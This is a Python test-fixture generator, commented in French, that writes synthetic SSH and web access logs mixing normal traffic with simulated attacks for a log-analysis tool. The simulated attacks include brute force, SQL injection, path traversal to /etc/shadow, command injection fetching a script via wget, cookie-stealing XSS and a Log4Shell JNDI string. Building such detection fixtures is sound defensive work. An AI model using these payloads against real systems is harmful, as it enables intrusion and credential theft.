"""Génère des journaux réalistes contenant du trafic légitime ET des attaques, pour tester l'outil.

Toutes les adresses utilisées appartiennent aux plages réservées à la documentation (RFC 5737).
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Tuple, Union
from urllib.parse import quote

BASE_DAY = datetime(2026, 9, 21)
HOST = "web01"
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/128.0 Safari/537.36"
)


def _syslog(ts: datetime, rng: random.Random, msg: str, proc: str = "sshd") -> str:
    return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {HOST} {proc}[{rng.randint(1000, 9999)}]: {msg}"


def _access(ts: datetime, ip: str, method: str, path: str, status: int, size: int, ua: str, ref: str = "-") -> str:
    return f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0200] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def _auth_lines(rng: random.Random) -> List[Tuple[datetime, str]]:
    lines: List[Tuple[datetime, str]] = []

    # Trafic légitime : administrateurs se connectant par clé, quelques fautes de frappe.
    for _ in range(20):
        ts = BASE_DAY + timedelta(hours=rng.randint(7, 19), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
        user, ip = rng.choice([("alice", "192.0.2.10"), ("bob", "192.0.2.11")])
        if rng.random() < 0.2:
            lines.append((ts, _syslog(ts, rng, f"Failed password for {user} from {ip} port {rng.randint(40000, 65000)} ssh2")))
            ts += timedelta(seconds=6)
        lines.append((ts, _syslog(ts, rng, f"Accepted publickey for {user} from {ip} port {rng.randint(40000, 65000)} ssh2")))

    # Bruit système (doit être ignoré par le parser).
    for hour in range(0, 24):
        ts = BASE_DAY + timedelta(hours=hour, minutes=17, seconds=1)
        lines.append((ts, _syslog(ts, rng, "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", "CRON")))

    # Attaque 1 : force brute sur root/admin puis connexion réussie (compromission).
    ts = BASE_DAY + timedelta(hours=10)
    attacker = "203.0.113.45"
    for _ in range(40):
        user = rng.choice(["root", "root", "admin"])
        lines.append((ts, _syslog(ts, rng, f"Failed password for {user} from {attacker} port {rng.randint(30000, 60000)} ssh2")))
        ts += timedelta(seconds=rng.randint(1, 4))
    lines.append((ts, _syslog(ts, rng, f"Accepted password for admin from {attacker} port {rng.randint(30000, 60000)} ssh2")))

    # Attaque 2 : password spraying sur des comptes de service inexistants.
    ts = BASE_DAY + timedelta(hours=13)
    sprayer = "198.51.100.23"
    for user in ["test", "oracle", "postgres", "ubuntu", "git", "ftpuser", "guest", "deploy"]:
        port = rng.randint(30000, 60000)
        lines.append((ts, _syslog(ts, rng, f"Invalid user {user} from {sprayer} port {port}")))
        lines.append((ts + timedelta(seconds=2), _syslog(ts + timedelta(seconds=2), rng,
                      f"Failed password for invalid user {user} from {sprayer} port {port} ssh2")))
        ts += timedelta(seconds=rng.randint(20, 45))
    return lines


def _web_lines(rng: random.Random) -> List[Tuple[datetime, str]]:
    lines: List[Tuple[datetime, str]] = []
    pages = ["/", "/index.html", "/about", "/contact", "/blog/", "/products.php?id=3",
             "/static/css/main.css", "/static/js/app.js", "/images/logo.png"] + [f"/blog/post-{i}" for i in range(1, 15)]

    # Trafic légitime.
    for _ in range(600):
        ts = BASE_DAY + timedelta(seconds=rng.randint(6 * 3600, 23 * 3600))
        ip = f"192.0.2.{rng.randint(20, 80)}"
        path = rng.choice(pages)
        status = rng.choices([200, 304, 404], weights=[85, 12, 3])[0]
        lines.append((ts, _access(ts, ip, "GET", path, status, rng.randint(300, 40000) if status == 200 else 0, BROWSER_UA)))

    # Attaque 3 : sqlmap sur un paramètre vulnérable.
    ts = BASE_DAY + timedelta(hours=11)
    sqlmap_ua = "sqlmap/1.8.3#stable (https://sqlmap.org)"
    payloads = ["1' AND 1=1-- -", "1' AND SLEEP(5)-- -", "1 UNION ALL SELECT NULL,NULL,version()-- -",
                "1' OR '1'='1", "1 AND extractvalue(1,concat(0x7e,database()))",
                "1; DROP TABLE users-- -", "-1 UNION SELECT username,password FROM information_schema.tables"]
    for i in range(28):
        payload = quote(payloads[i % len(payloads)], safe="")
        lines.append((ts, _access(ts, "203.0.113.77", "GET", f"/products.php?id={payload}",
                                  rng.choice([200, 200, 500]), rng.randint(0, 6000), sqlmap_ua)))
        ts += timedelta(seconds=rng.randint(1, 3))

    # Attaque 4 : énumération de répertoires avec gobuster.
    ts = BASE_DAY + timedelta(hours=14)
    words = ["admin", "backup", "old", "test", "dev", "api", "uploads", "phpmyadmin", "wp-login.php", "wp-admin",
             "server-status", ".git/HEAD", ".env", "config.php.bak", "db.sql", "private", "cgi-bin", "console",
             "manager/html", "login", "dashboard", "tmp", "logs", "shell.php", "cmd.php", "portal", "secret",
             "internal", "include", "vendor", "install", "setup.php", "readme.txt", "robots.txt", "sitemap.xml"]
    for word in words * 2:
        status = 403 if word in (".env", ".git/HEAD") else (200 if word in ("robots.txt", "login") else 404)
        lines.append((ts, _access(ts, "198.51.100.99", "GET", f"/{word}", status, 0, "gobuster/3.6")))
        ts += timedelta(milliseconds=400)

    # Attaque 5 : traversée de répertoires qui ABOUTIT (réponse 200).
    ts = BASE_DAY + timedelta(hours=15, minutes=5)
    for path in ["/download.php?file=../../../../etc/passwd",
                 "/download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
                 "/download.php?file=....//....//etc/hosts"]:
        lines.append((ts, _access(ts, "203.0.113.200", "GET", path, 200, 2310, "curl/8.5.0")))
        ts += timedelta(seconds=7)

    # Attaque 6 : injection de commandes.
    ts = BASE_DAY + timedelta(hours=15, minutes=40)
    for cmd in [";id", ";cat /etc/passwd", "|whoami", "$(uname -a)", "&& wget http://203.0.113.66/x.sh"]:
        lines.append((ts, _access(ts, "203.0.113.66", "GET", f"/ping.php?host=127.0.0.1{quote(cmd, safe='')}",
                                  200, 512, "python-requests/2.32.3")))
        ts += timedelta(seconds=5)

    # Attaque 7 : XSS.
    ts = BASE_DAY + timedelta(hours=16, minutes=12)
    for p in ['<script>alert(document.cookie)</script>', '"><img src=x onerror=alert(1)>', "javascript:alert(1)"]:
        lines.append((ts, _access(ts, "203.0.113.9", "GET", f"/search?q={quote(p, safe='')}", 200, 1800, BROWSER_UA)))
        ts += timedelta(seconds=30)

    # Attaque 8 : Log4Shell via le User-Agent.
    ts = BASE_DAY + timedelta(hours=17, minutes=3)
    lines.append((ts, _access(ts, "198.51.100.150", "GET", "/", 200, 5120, "${jndi:ldap://198.51.100.150:1389/Exploit}")))

    # Attaque 9 : flood applicatif sur une API.
    ts = BASE_DAY + timedelta(hours=18)
    for _ in range(420):
        lines.append((ts, _access(ts, "192.0.2.250", "GET", f"/api/items?page={rng.randint(1, 50)}", 200, 950, "Go-http-client/1.1")))
        ts += timedelta(milliseconds=120)
    return lines


def generate_samples(out_dir: Union[str, Path], seed: int = 42) -> Tuple[Path, Path]:
    """Écrit ``auth.log`` et ``access.log`` dans ``out_dir`` et retourne leurs chemins."""
    rng = random.Random(seed)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    auth_path, web_path = out / "auth.log", out / "access.log"
    for path, lines in ((auth_path, _auth_lines(rng)), (web_path, _web_lines(rng))):
        lines.sort(key=lambda item: item[0])
        path.write_text("\n".join(line for _, line in lines) + "\n", encoding="utf-8")
    return auth_path, web_path
